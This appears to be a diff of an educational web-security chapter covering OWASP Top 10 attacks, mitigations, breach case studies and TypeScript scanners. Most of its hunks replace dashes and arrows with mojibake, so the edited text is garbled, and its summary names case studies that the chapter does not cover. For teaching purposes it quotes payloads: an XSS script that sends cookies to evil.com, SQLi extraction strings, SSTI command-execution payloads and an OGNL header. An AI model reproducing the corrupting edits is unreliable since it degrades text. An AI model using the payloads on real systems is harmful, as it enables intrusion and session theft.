@@ -1,12 +1,12 @@
-# Chapter 5: Web Security
+﻿# Chapter 5: Web Security
 
-> **Prereq:** Chapter 4 (System & Software Security) — web apps build on OS foundations.
-> **Next:** Chapter 6 (IAM) — web authentication relies on secure identity management.
+> **Prereq:** Chapter 4 (System & Software Security) â€” web apps build on OS foundations.
+> **Next:** Chapter 6 (IAM) â€” web authentication relies on secure identity management.
 ---
 
 ## Learning Objectives
 
-- Master OWASP Top 10 (2021) — every category, exploit mechanics, and mitigation
+- Master OWASP Top 10 (2021) â€” every category, exploit mechanics, and mitigation
 - Exploit and defend against SQL Injection, XSS, CSRF, SSRF, XXE, LFI/RFI, deserialization, request smuggling
 - Use Burp Suite, ZAP, sqlmap, JWT manipulation tools in hands-on testing
 - Analyze real-world breaches: Equifax 2017, GitHub Memcrashed 2018, Facebook SSRF 2019, British Airways Magecart 2018
@@ -16,16 +16,16 @@
 <!-- Image Gallery -->
 <section class="lesson-visuals" aria-label="Visual learning resources">
   <header><span>VISUAL LEARNING</span><h2>See it. Review it. Remember it.</h2></header>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/05-web-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/05-web-security/.png" alt="Handwritten notes" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/05-web-security/handwritten-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/05-web-security/handwritten-notes.png" alt="Handwritten notes" loading="lazy">
     <span><strong>Handwritten notes</strong>Condensed notes for deliberate review.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/05-web-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/05-web-security/.png" alt="Sticky-note revision" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/05-web-security/sticky-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/05-web-security/sticky-notes.png" alt="Sticky-note revision" loading="lazy">
     <span><strong>Sticky-note revision</strong>Fast recall prompts for revision.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/05-web-security/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/05-web-security/.png" alt="Visual concept guide" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/05-web-security/visual-explanation.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/05-web-security/visual-explanation.png" alt="Visual concept guide" loading="lazy">
     <span><strong>Visual concept guide</strong>A connected explanation of the key ideas.</span>
   </a>
 </section>
@@ -50,7 +50,7 @@
 
 | 7 | HTTP Request Smuggling | Request boundary validation |
 
-| 8 | LFI/RFI → RCE | Path sanitization + allowlists |
+| 8 | LFI/RFI â†’ RCE | Path sanitization + allowlists |
 
 | 9 | XXE | Disable external entity processing |
 
@@ -60,13 +60,13 @@
 
 | 12 | Case Studies | Equifax, GitHub, Facebook, British Airways |
 
-| 13 | Bug Bounty Methodology | Recon → exploit → report workflow |
+| 13 | Bug Bounty Methodology | Recon â†’ exploit â†’ report workflow |
 
 | 14 | Interview Corner | 15 Q&As on web security fundamentals |
 
 ---
 
-## OWASP Top 10 (2021) — Overview Table
+## OWASP Top 10 (2021) â€” Overview Table
 
 | Rank | Category | Description | Risk Score | Exploitability | Prevalence | Detectability | Technical Impact |
 
@@ -101,10 +101,10 @@
 ### Attack Steps (IDOR)
 
 
-1. User logs in — gets session cookie
-2. User clicks "My Profile" — browser sends GET /api/user/123
-3. Attacker changes 123 to 456 — GET /api/user/456
-4. Server returns user 456 data — no ownership check
+1. User logs in â€” gets session cookie
+2. User clicks "My Profile" â€” browser sends GET /api/user/123
+3. Attacker changes 123 to 456 â€” GET /api/user/456
+4. Server returns user 456 data â€” no ownership check
 ### Vulnerable Code (Java Spring Boot)
 
 
@@ -139,7 +139,7 @@ public User getUser(@PathVariable Long id, Authentication auth) {
 ### Mitigation
 
 
-- Deny by default — every access check fails closed
+- Deny by default â€” every access check fails closed
 - Use centralized ACLs, not scattered if-checks
 - Rate-limit API endpoints
 - Log and alert on repeated 403s
@@ -229,7 +229,7 @@ private static final String API_KEY = System.getenv("PAYMENT_API_KEY");
 1. App constructs: SELECT * FROM users WHERE id = '$_GET["id"]'
 2. Attacker inputs: `" OR 1=1 --`
 3. Query becomes: SELECT * FROM users WHERE id = "" OR 1=1 --"
-4. All rows returned — authentication bypassed
+4. All rows returned â€” authentication bypassed
 #### Vulnerable Code (PHP)
 
 
@@ -264,21 +264,21 @@ while ($row = mysqli_fetch_assoc($result)) {
 
 ```
 
-#### Dry Run — Blind Boolean SQLi
+#### Dry Run â€” Blind Boolean SQLi
 
 
 ```
 
 Target: http://example.com/product?id=1
 Goal: Extract admin password hash character by character
-Step 1: id=1 → 200 OK (product shown)
-Step 2: id=1" → 500 Error (injection detected)
-Step 3: id=1" AND 1=1 -- → 200 OK (true)
-Step 4: id=1" AND 1=2 -- → 404 (false — blind confirmed)
-Step 5: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="a" -- → 404
-Step 6: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="b" -- → 404
+Step 1: id=1 â†’ 200 OK (product shown)
+Step 2: id=1" â†’ 500 Error (injection detected)
+Step 3: id=1" AND 1=1 -- â†’ 200 OK (true)
+Step 4: id=1" AND 1=2 -- â†’ 404 (false â€” blind confirmed)
+Step 5: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="a" -- â†’ 404
+Step 6: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="b" -- â†’ 404
 ...
-Step N: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="$" -- → 200
+Step N: id=1" AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username="admin")="$" -- â†’ 200
 => First char = "$"
 => Repeat for positions 2..N
 
@@ -343,7 +343,7 @@ Content-Type: application/json
 
 ```
 
-Query becomes `db.users.findOne({ username: "admin", password: { $ne: "" } })` — matches any non-empty password.
+Query becomes `db.users.findOne({ username: "admin", password: { $ne: "" } })` â€” matches any non-empty password.
 #### Secure Code
 
 
@@ -509,7 +509,7 @@ public String search(@RequestParam String q, Model model) {
 
 1. Attacker posts comment: <script>fetch("https://evil.com/log?c="+document.cookie)&lt;/script&gt;
 2. Server stores malicious comment in database
-3. Every visitor loads the page — comment rendered — script executes
+3. Every visitor loads the page â€” comment rendered â€” script executes
 4. Attacker collects session cookies
 #### Vulnerable Code
 
@@ -598,15 +598,15 @@ document.getElementById('greeting').innerHTML = DOMPurify.sanitize(name);
 
 |-------|---------|-------------|
 
-| 1 — Output Encoding | HTML entity encode &lt;>&"\' | Low if context-aware |
+| 1 â€” Output Encoding | HTML entity encode &lt;>&"\' | Low if context-aware |
 
-| 2 — CSP | script-src "self" blocks inline | Medium (if nonce/hash used) |
+| 2 â€” CSP | script-src "self" blocks inline | Medium (if nonce/hash used) |
 
-| 3 — HttpOnly | Blocks cookie theft via XSS | Low (but does not prevent keylogging) |
+| 3 â€” HttpOnly | Blocks cookie theft via XSS | Low (but does not prevent keylogging) |
 
-| 4 — Input Validation | Allowlist patterns | Medium (XSS in attributes) |
+| 4 â€” Input Validation | Allowlist patterns | Medium (XSS in attributes) |
 
-| 5 — DOMPurify | Library-level sanitization | Low |
+| 5 â€” DOMPurify | Library-level sanitization | Low |
 
 **Risk:** High | **Complexity:** Low-Medium | **OWASP Score:** 6.5
 ---
@@ -621,7 +621,7 @@ document.getElementById('greeting').innerHTML = DOMPurify.sanitize(name);
 1. Victim logs into bank.com (gets session cookie)
 2. Victim visits evil.com while still logged in
 3. evil.com loads: <img src="http://bank.com/transfer?to=attacker&amount=10000">
-4. Browser sends request with cookie — server thinks victim authorized it
+4. Browser sends request with cookie â€” server thinks victim authorized it
 #### Vulnerable Code
 
 
@@ -698,7 +698,7 @@ public String transfer(@RequestParam String _csrf, ...) {
 **Risk:** High | **Complexity:** Low | **OWASP Score:** 6.5
 ## 17. Case Studies: Equifax, GitHub, Facebook, British Airways
 
-### Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638
+### Case Study 1: Equifax 2017 â†’ Apache Struts CVE-2017-5638
 
 
 **Attack Type:** OGNL Injection via Content-Type header (RCE)
@@ -707,13 +707,13 @@ public String transfer(@RequestParam String _csrf, ...) {
 #### Full Attack Chain
 
 1. **Reconnaissance:** Attacker identifies Equifax uses Apache Struts 2 with REST plugin
-2. **Vulnerability:** CVE-2017-5638 → Struts 2 REST plugin fails to sanitize Content-Type header
-3. **Exploit → OGNL Injection:** Attacker sends a crafted Content-Type header containing OGNL expression
+2. **Vulnerability:** CVE-2017-5638 â†’ Struts 2 REST plugin fails to sanitize Content-Type header
+3. **Exploit â†’ OGNL Injection:** Attacker sends a crafted Content-Type header containing OGNL expression
 4. **RCE:** Expression executes, downloads web shell to server
 5. **Persistence:** Web shell deployed to /opt/apache/webapps/shell.jsp
 6. **Lateral Movement:** Internal access used to reach database servers
 7. **Exfiltration:** 147M records (names, SSNs, DOB, addresses) over encrypted channels
-8. **Delay:** Breach undetected for 76 days (no logging/monitoring → A09)
+8. **Delay:** Breach undetected for 76 days (no logging/monitoring â†’ A09)
 
 ```http
 # OGNL injection payload in Content-Type header
@@ -732,7 +732,7 @@ Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER
 
 
 **Attack Type:** Amplified DDoS via memcached UDP reflection
-**Impact:** 1.35 Tbps DDoS → largest at the time
+**Impact:** 1.35 Tbps DDoS â†’ largest at the time
 **Duration:** ~20 minutes
 #### Attack Chain
 
@@ -773,7 +773,7 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 - Validate resolved IP, not just domain
 - Use random ephemeral hostnames to prevent DNS rebinding
 - Network segmentation: app tier should not have metadata access
-### Case Study 4: British Airways 2018 → Magecart
+### Case Study 4: British Airways 2018 â†’ Magecart
 
 
 **Attack Type:** Third-party JavaScript skimmer
@@ -1056,7 +1056,7 @@ public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletRequest
 
 
 ```html
-<!-- Subresource Integrity → browser verifies hash before executing -->
+<!-- Subresource Integrity â†’ browser verifies hash before executing -->
 <script src="https://cdn.example.com/script.js"
         integrity="sha384-oVuMAfCqT81bP+7GX7wF1kCTMGxM+Ewp0f0c4pL3cRz+8XxPpD+WvUo6CqA+Hj"
         crossorigin="anonymous"></script>
@@ -1124,7 +1124,7 @@ public class SecurityLoggingAspect {
 
 
 ```text
-Detection → Analysis → Containment → Eradication → Recovery → Postmortem
+Detection â†’ Analysis â†’ Containment â†’ Eradication â†’ Recovery â†’ Postmortem
 Industry benchmarks:
 - Mean Time to Detect (MTTD): 207 days (IBM 2023)
 - Mean Time to Contain (MTTC): 73 days
@@ -1201,7 +1201,7 @@ Industry benchmarks:
 
 |--------------|--------|
 
-| SSRF | Metadata service → IAM credential theft |
+| SSRF | Metadata service â†’ IAM credential theft |
 
 | Broken Access Control | Cross-account resource access |
 
@@ -1222,7 +1222,7 @@ Industry benchmarks:
 ### Q3: What is the difference between Reflected, Stored, and DOM-based XSS?
 
 
-**Answer:** Reflected XSS: payload comes from the current HTTP request (typically URL), echoed by the server without encoding. Stored XSS: payload stored on the server (database, comment, profile) and served to all visitors → most dangerous. DOM-based XSS: vulnerability exists solely in client-side JavaScript → server never sees the payload. All three execute in the victim's browser context.
+**Answer:** Reflected XSS: payload comes from the current HTTP request (typically URL), echoed by the server without encoding. Stored XSS: payload stored on the server (database, comment, profile) and served to all visitors â†’ most dangerous. DOM-based XSS: vulnerability exists solely in client-side JavaScript â†’ server never sees the payload. All three execute in the victim's browser context.
 ### Q4: How does Content Security Policy (CSP) prevent XSS?
 
 
@@ -1250,7 +1250,7 @@ Industry benchmarks:
 ### Q10: How does HTTPS protect against MITM attacks?
 
 
-**Answer:** HTTPS uses TLS to provide: (1) Encryption → data is encrypted so eavesdroppers cannot read it. (2) Authentication → server presents a certificate signed by a trusted CA. (3) Integrity → TLS MAC ensures data was not modified in transit.
+**Answer:** HTTPS uses TLS to provide: (1) Encryption â†’ data is encrypted so eavesdroppers cannot read it. (2) Authentication â†’ server presents a certificate signed by a trusted CA. (3) Integrity â†’ TLS MAC ensures data was not modified in transit.
 ### Q11: What is deserialization attack and how does ysoserial work?
 
 
@@ -1262,15 +1262,15 @@ Industry benchmarks:
 ### Q13: What is the difference between WAF and RASP?
 
 
-**Answer:** WAF operates at the network edge, inspecting HTTP requests using signatures. It blocks known attack patterns but can be bypassed. RASP runs inside the application, intercepting actual code execution. It sees parsed, normalized data → harder to bypass. RASP blocks both known and unknown attacks but requires agent integration.
+**Answer:** WAF operates at the network edge, inspecting HTTP requests using signatures. It blocks known attack patterns but can be bypassed. RASP runs inside the application, intercepting actual code execution. It sees parsed, normalized data â†’ harder to bypass. RASP blocks both known and unknown attacks but requires agent integration.
 ### Q14: How do you test for SSTI?
 
 
-**Answer:** Inject template expressions and observe the response. Test: `{{7*7}}` → if response contains "49", SSTI confirmed. For Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. For Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
+**Answer:** Inject template expressions and observe the response. Test: `{{7*7}}` â†’ if response contains "49", SSTI confirmed. For Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. For Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
 ### Q15: What is a bug bounty program and how do you approach it?
 
 
-**Answer:** A bug bounty program offers rewards for finding security vulnerabilities. Approach: (1) Recon → enumerate subdomains, endpoints, tech stack. (2) Automated scanning → run tools with throttle. (3) Manual testing → focus on logic flaws. (4) Exploitation → prove impact without damage. (5) Report → clear, reproducible steps with PoC. Top categories: XSS, IDOR, SSRF.
+**Answer:** A bug bounty program offers rewards for finding security vulnerabilities. Approach: (1) Recon â†’ enumerate subdomains, endpoints, tech stack. (2) Automated scanning â†’ run tools with throttle. (3) Manual testing â†’ focus on logic flaws. (4) Exploitation â†’ prove impact without damage. (5) Report â†’ clear, reproducible steps with PoC. Top categories: XSS, IDOR, SSRF.
 ---
 
 ## 27. Summary
@@ -1297,16 +1297,16 @@ Industry benchmarks:
 ### Core Takeaways
 
 
-- OWASP Top 10 (2021) → ten critical web risks ranked by exploitability, prevalence, and impact
-- Injection (A03) → separate data from commands with parameterized queries
-- XSS → context-aware output encoding + CSP as defense-in-depth
-- CSRF → anti-CSRF tokens + SameSite cookies for all state-changing requests
-- SSRF → URL allowlists + block internal IP ranges
-- Secure Headers → CSP, HSTS, XFO, X-Content-Type-Options create browser-enforced defense layers
-- Deserialization → never deserialize untrusted data; use JSON with type validation
-- File Upload → validate type, rename files, store outside webroot
-- Bug Bounty → recon, exploit, report with clear PoC
-- Case Studies → Equifax (unpatched Struts), GitHub (memcached amplification), Facebook (SSRF + DNS rebinding), British Airways (third-party JS skimmer)
+- OWASP Top 10 (2021) â†’ ten critical web risks ranked by exploitability, prevalence, and impact
+- Injection (A03) â†’ separate data from commands with parameterized queries
+- XSS â†’ context-aware output encoding + CSP as defense-in-depth
+- CSRF â†’ anti-CSRF tokens + SameSite cookies for all state-changing requests
+- SSRF â†’ URL allowlists + block internal IP ranges
+- Secure Headers â†’ CSP, HSTS, XFO, X-Content-Type-Options create browser-enforced defense layers
+- Deserialization â†’ never deserialize untrusted data; use JSON with type validation
+- File Upload â†’ validate type, rename files, store outside webroot
+- Bug Bounty â†’ recon, exploit, report with clear PoC
+- Case Studies â†’ Equifax (unpatched Struts), GitHub (memcached amplification), Facebook (SSRF + DNS rebinding), British Airways (third-party JS skimmer)
 ### Attack Comparison Table
 
 
@@ -1332,19 +1332,19 @@ Industry benchmarks:
 
 | Takeaway | Application |
 |----------|-------------|
-| OWASP Top 10 Prioritization | Focus on A01 (Broken Access Control), A03 (Injection), and A07 (Auth Failures) — these have the highest exploitability and prevalence |
+| OWASP Top 10 Prioritization | Focus on A01 (Broken Access Control), A03 (Injection), and A07 (Auth Failures) â€” these have the highest exploitability and prevalence |
 | Injection Prevention | Always use parameterized queries for SQL, validate input types for NoSQL, avoid shell execution with user input, escape LDAP filters |
 | XSS Defense | Apply context-aware output encoding (HTML entity, JavaScript, CSS, URL), implement CSP with nonces, use HttpOnly cookies for session tokens |
 | CSRF Protection | Use anti-CSRF tokens for all state-changing requests, set SameSite=Lax or Strict on cookies, validate Origin/Referer headers |
 | SSRF Mitigation | Block metadata endpoints (169.254.169.254), validate resolved IPs (not just domains), use URL allowlists, enforce IMDSv2 |
 | Secure Headers & Configuration | Set CSP, HSTS, X-Frame-Options, X-Content-Type-Options; disable directory listing, verbose errors, and unused HTTP methods |
-| Bug Bounty Methodology | Follow recon → exploit → report workflow; use automated scanners for low-hanging fruit and manual testing for logic flaws |
+| Bug Bounty Methodology | Follow recon â†’ exploit â†’ report workflow; use automated scanners for low-hanging fruit and manual testing for logic flaws |
 
 ---
 
 ## Summary
 
-Web application security addresses vulnerabilities that arise from the fundamental nature of HTTP, browser-based execution, and the complexity of modern web stacks. This chapter covered the OWASP Top 10 (2021), with deep dives into the most exploited categories: broken access control (IDOR), injection (SQLi, XSS, CSRF, SSRF, XXE), and cryptographic failures (JWT flaws, weak TLS). The importance of defense-in-depth was illustrated through layered protections — WAF, CSP, HSTS, CORS configuration, input validation, parameterized queries, and client-side sanitization. Real-world breaches (Equifax, GitHub Stars, SolarWinds, Atlassian) demonstrated that even well-funded organizations fall victim to preventable vulnerabilities when secure development practices are not followed. Key takeaways include: always use parameterized queries for database access, implement CSP with strict directives, treat all user input as untrusted, use SameSite cookies to mitigate CSRF, and conduct regular dependency scans for known vulnerabilities. The TypeScript implementations provided working examples of CSP generators, SQLi scanners, session analyzers, and SSRF detectors that can be integrated into security testing pipelines.
+Web application security addresses vulnerabilities that arise from the fundamental nature of HTTP, browser-based execution, and the complexity of modern web stacks. This chapter covered the OWASP Top 10 (2021), with deep dives into the most exploited categories: broken access control (IDOR), injection (SQLi, XSS, CSRF, SSRF, XXE), and cryptographic failures (JWT flaws, weak TLS). The importance of defense-in-depth was illustrated through layered protections â€” WAF, CSP, HSTS, CORS configuration, input validation, parameterized queries, and client-side sanitization. Real-world breaches (Equifax, GitHub Stars, SolarWinds, Atlassian) demonstrated that even well-funded organizations fall victim to preventable vulnerabilities when secure development practices are not followed. Key takeaways include: always use parameterized queries for database access, implement CSP with strict directives, treat all user input as untrusted, use SameSite cookies to mitigate CSRF, and conduct regular dependency scans for known vulnerabilities. The TypeScript implementations provided working examples of CSP generators, SQLi scanners, session analyzers, and SSRF detectors that can be integrated into security testing pipelines.
 
 ## Exercises
 
@@ -1354,7 +1354,7 @@ Web application security addresses vulnerabilities that arise from the fundament
 
 <details>
 <summary>Solution</summary>
-IDOR exploits missing authorization checks — the attacker directly accesses resources they should not have access to (e.g., changing a user ID in a URL). CSRF exploits the browser's automatic inclusion of credentials — the attacker tricks the user's browser into making an unwanted request to an authenticated site.
+IDOR exploits missing authorization checks â€” the attacker directly accesses resources they should not have access to (e.g., changing a user ID in a URL). CSRF exploits the browser's automatic inclusion of credentials â€” the attacker tricks the user's browser into making an unwanted request to an authenticated site.
 </details>
 
 2. Why does CSP with `script-src 'self'` alone not prevent all XSS attacks?
@@ -1375,14 +1375,14 @@ The attacker modifies the JWT header to `"alg":"none"` and removes the signature
 
 <details>
 <summary>Solution</summary>
-Blind SQLi: no visible error/output — attacker infers truth via boolean responses (content differs) or time delays (SLEEP()). Out-of-band SQLi: attacker uses a separate channel (DNS lookup, HTTP request) to exfiltrate data. OOB is used when the response is not directly visible and the database can initiate network connections.
+Blind SQLi: no visible error/output â€” attacker infers truth via boolean responses (content differs) or time delays (SLEEP()). Out-of-band SQLi: attacker uses a separate channel (DNS lookup, HTTP request) to exfiltrate data. OOB is used when the response is not directly visible and the database can initiate network connections.
 </details>
 
 5. Why is stored XSS considered more dangerous than reflected XSS?
 
 <details>
 <summary>Solution</summary>
-Stored XSS persists in the database and executes every time the page is viewed — affecting all users without requiring a crafted link. Reflected XSS only affects the user who clicks a malicious link. Stored XSS can target admins (if viewing in admin panel), leading to account takeover, while reflected typically targets end users.
+Stored XSS persists in the database and executes every time the page is viewed â€” affecting all users without requiring a crafted link. Reflected XSS only affects the user who clicks a malicious link. Stored XSS can target admins (if viewing in admin panel), leading to account takeover, while reflected typically targets end users.
 </details>
 ### Application Problems
 
@@ -1434,7 +1434,7 @@ Design a complete security architecture for an e-commerce application considerin
 
 <details>
 <summary>Solution</summary>
-Threat model (STRIDE): Spoofing → MFA + FIDO2. Tampering → signed API payloads + SRI for CDN scripts. Repudiation → detailed audit logging. Info disclosure → TLS 1.3 + AES-256 at rest + CSP. DoS → rate limiting + WAF + CDN. Elevation → RBAC + server-side auth checks.
+Threat model (STRIDE): Spoofing â†’ MFA + FIDO2. Tampering â†’ signed API payloads + SRI for CDN scripts. Repudiation â†’ detailed audit logging. Info disclosure â†’ TLS 1.3 + AES-256 at rest + CSP. DoS â†’ rate limiting + WAF + CDN. Elevation â†’ RBAC + server-side auth checks.
 
 Architecture: WAF (ModSecurity with OWASP CRS) in front. CSP with nonces. SSRF prevention via URL allowlist + block private IPs. Session: HttpOnly Secure SameSite=Strict cookies, 15-min idle timeout. File upload: magic byte validation + UUID rename + scan with ClamAV. SRI: integrity hashes on all third-party resources.
 </details>
@@ -1442,7 +1442,7 @@ Architecture: WAF (ModSecurity with OWASP CRS) in front. CSP with nonces. SSRF p
 
 | # | Question | A | B | C | D | Answer |
 |---|----------|---|---|---|---|--------|
-| 1 | Which OWASP Top 10 (2021) category has the highest exploitability score? | A01 → Broken Access Control | A03 → Injection | A06 → Vulnerable Components | A09 → Logging & Monitoring | B |
+| 1 | Which OWASP Top 10 (2021) category has the highest exploitability score? | A01 â†’ Broken Access Control | A03 â†’ Injection | A06 â†’ Vulnerable Components | A09 â†’ Logging & Monitoring | B |
 | 2 | A JWT token with header `{"alg":"none"}` is vulnerable to: | SQLi | Signature bypass | XSS | CSRF | B |
 | 3 | The Equifax 2017 breach was caused by: | SQLi | Apache Struts OGNL injection | Phishing | SSRF | B |
 | 4 | SameSite=Lax cookie attribute protects against: | SQLi | XSS | CSRF | SSRF | C |
@@ -2907,7 +2907,7 @@ Low                 | Low    | Low    | Medium | Medium
 
 ## 42. Final Review
 
-### OWASP Top 10 (2021) → Quick Reference
+### OWASP Top 10 (2021) â†’ Quick Reference
 
 
 | # | Category | Key Prevention |
@@ -2976,11 +2976,11 @@ The following TypeScript class implements a comprehensive XSS detection and sani
 
 ```typescript
 /**
- * XSSFinding — describes a detected XSS vulnerability
- * @property type — classification of XSS (stored, reflected, or DOM-based)
- * @property payload — the malicious snippet discovered
- * @property severity — risk level based on OWASP guidelines
- * @property vulnerableParam — the input parameter or DOM sink that carried the payload
+ * XSSFinding â€” describes a detected XSS vulnerability
+ * @property type â€” classification of XSS (stored, reflected, or DOM-based)
+ * @property payload â€” the malicious snippet discovered
+ * @property severity â€” risk level based on OWASP guidelines
+ * @property vulnerableParam â€” the input parameter or DOM sink that carried the payload
  */
 interface XSSFinding {
   type: 'stored' | 'reflected' | 'dom';
@@ -2990,7 +2990,7 @@ interface XSSFinding {
 }
 
 /**
- * XSSDetector — scans user-controlled input for XSS attack vectors
+ * XSSDetector â€” scans user-controlled input for XSS attack vectors
  * and provides a sanitize() method that strips dangerous constructs.
  *
  * Covered attack surfaces:
@@ -3044,7 +3044,7 @@ class XSSDetector {
         const type = this.classifyPayload(payload);
         findings.push({
           type,
-          payload: payload.length > 120 ? payload.slice(0, 120) + '…' : payload,
+          payload: payload.length > 120 ? payload.slice(0, 120) + 'â€¦' : payload,
           severity: this.assessSeverity(payload, type),
           vulnerableParam: this.identifyParam(input, match.index),
         });
@@ -3114,11 +3114,11 @@ class XSSDetector {
 
   /**
    * Sanitize input by stripping or encoding dangerous constructs.
-   * This is a defense-in-depth approach — never rely solely on sanitization;
+   * This is a defense-in-depth approach â€” never rely solely on sanitization;
    * always pair with context-aware output encoding.
    *
    * Strategy:
-   * 1. Normalize dangerous keywords (mixed-case → lowercase for matching)
+   * 1. Normalize dangerous keywords (mixed-case â†’ lowercase for matching)
    * 2. Remove script tags entire blocks
    * 3. Strip event handler attributes
    * 4. Neutralize javascript:/data: URIs
@@ -3182,12 +3182,12 @@ This TypeScript class implements a multi-strategy SQL Injection scanner. It test
 
 ```typescript
 /**
- * SQLiFinding — describes a detected SQL injection vulnerability
- * @property endpoint — the URL or API path where the injection was found
- * @property parameter — the vulnerable input parameter
- * @property payload — the injection string that triggered the finding
- * @property dbType — the suspected database management system
- * @property riskLevel — qualitative risk assessment
+ * SQLiFinding â€” describes a detected SQL injection vulnerability
+ * @property endpoint â€” the URL or API path where the injection was found
+ * @property parameter â€” the vulnerable input parameter
+ * @property payload â€” the injection string that triggered the finding
+ * @property dbType â€” the suspected database management system
+ * @property riskLevel â€” qualitative risk assessment
  */
 interface SQLiFinding {
   endpoint: string;
@@ -3198,7 +3198,7 @@ interface SQLiFinding {
 }
 
 /**
- * SQLiTestResult — captures the outcome of a single probe
+ * SQLiTestResult â€” captures the outcome of a single probe
  */
 interface SQLiTestResult {
   payload: string;
@@ -3209,7 +3209,7 @@ interface SQLiTestResult {
 }
 
 /**
- * SQLiScanner — scans payload strings for SQL injection indicators
+ * SQLiScanner â€” scans payload strings for SQL injection indicators
  * and generates differentiated test payloads for each major DBMS.
  *
  * Attack vectors covered:
@@ -3271,7 +3271,7 @@ class SQLiScanner {
       findings.push({
         endpoint: '(dynamic)',
         parameter: 'input',
-        payload: payload.length > 120 ? payload.slice(0, 120) + '…' : payload,
+        payload: payload.length > 120 ? payload.slice(0, 120) + 'â€¦' : payload,
         dbType,
         riskLevel,
       });
@@ -3433,7 +3433,7 @@ const findings = scanner.scanPayload(malicious);
 console.log(`Scanning: ${malicious}`);
 for (const f of findings) {
   console.log(
-    `  → [${f.riskLevel.toUpperCase()}] ${f.dbType}: matched injection pattern`
+    `  â†’ [${f.riskLevel.toUpperCase()}] ${f.dbType}: matched injection pattern`
   );
 }
 ```
@@ -3454,7 +3454,7 @@ sequenceDiagram
     Note over Attacker,DB: SQL Injection Attack Flow
 
     rect rgb(240, 240, 255)
-    Note over Attacker,WebApp: Step 1 — Reconnaissance
+    Note over Attacker,WebApp: Step 1 â€” Reconnaissance
     Attacker->>WebApp: GET /product?id=1'
     WebApp->>DB: SELECT * FROM products WHERE id = '1''
     DB-->>WebApp: ERROR: syntax error at or near "''"
@@ -3462,16 +3462,16 @@ sequenceDiagram
     end
 
     rect rgb(240, 255, 240)
-    Note over Attacker,WebApp: Step 2 — Error-Based Injection
+    Note over Attacker,WebApp: Step 2 â€” Error-Based Injection
     Attacker->>WebApp: GET /product?id=1' AND 1=CONVERT(int, @@version)--
     WebApp->>DB: SELECT * FROM products WHERE id = '1' AND 1=CONVERT(int, @@version)--'
     DB-->>WebApp: ERROR: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019' to int
     WebApp-->>Attacker: Error message contains SQL Server version
-    Note over Attacker: DB type identified → MSSQL 2019
+    Note over Attacker: DB type identified â†’ MSSQL 2019
     end
 
     rect rgb(255, 240, 240)
-    Note over Attacker,DB: Step 3 — UNION-Based Extraction
+    Note over Attacker,DB: Step 3 â€” UNION-Based Extraction
     Attacker->>WebApp: GET /product?id=1 UNION SELECT username, password FROM users--
     WebApp->>DB: SELECT * FROM products WHERE id = '1' UNION SELECT username, password FROM users--'
     DB-->>WebApp: Result set: (admin, hash$123...), (john, hash$456...)
